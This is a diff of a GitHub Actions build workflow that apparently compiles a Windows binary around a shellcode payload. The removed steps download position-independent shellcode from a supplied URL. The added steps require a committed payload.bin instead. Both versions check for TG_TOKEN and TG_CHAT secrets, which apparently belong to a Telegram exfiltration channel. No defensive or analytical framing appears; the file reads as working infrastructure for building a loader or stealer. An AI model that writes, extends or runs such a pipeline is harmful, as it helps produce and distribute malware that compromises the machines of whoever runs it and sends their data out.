@@ -1,13 +1,7 @@
-# language: YAML, file: .github/workflows/build.yml
 name: build
 
 on:
   workflow_dispatch:
-    inputs:
-      payload_url:
-        description: "raw URL to position-independent payload (shellcode)"
-        required: true
-        type: string
   push:
     tags: ['v*']
 
@@ -20,20 +14,18 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Fetch payload
+      - name: Payload present
         shell: pwsh
         run: |
-          $u = "${{ github.event.inputs.payload_url }}"
-          if (-not $u) { $u = "${{ vars.PAYLOAD_URL }}" }
-          if (-not $u) { throw "payload_url not set" }
-          Invoke-WebRequest -Uri $u -OutFile payload.bin
+          if (-not (Test-Path payload.bin)) { throw "payload.bin missing from repo" }
+          Get-Item payload.bin | Select-Object Length
 
-      - name: Sanity check secrets
+      - name: Secrets present
         shell: pwsh
         run: |
           if (-not $env:TG_TOKEN) { throw "TG_TOKEN missing" }
           if (-not $env:TG_CHAT)  { throw "TG_CHAT missing" }
-          Write-Host "secrets present, length token=$($env:TG_TOKEN.Length) chat=$($env:TG_CHAT.Length)"
+          Write-Host "secrets ok"
 
       - name: MSVC env
         uses: ilammy/msvc-dev-cmd@v1
